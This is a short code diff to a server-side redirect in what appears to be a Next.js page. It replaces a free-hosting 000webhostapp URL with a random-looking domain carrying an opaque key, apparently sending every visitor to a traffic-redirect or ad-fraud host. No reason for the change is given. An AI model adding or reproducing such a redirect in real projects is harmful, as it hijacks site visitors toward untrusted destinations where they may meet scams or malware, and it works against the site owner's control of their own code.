@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://nursekesath.000webhostapp.com/` + encodeURI(path as string)
+					`https://plumpobstructionmortal.com/xjjwmdwna?key=cffa9f4652f967de182f5c0f0c006ec1/`
 				}`,
 			},
 		};
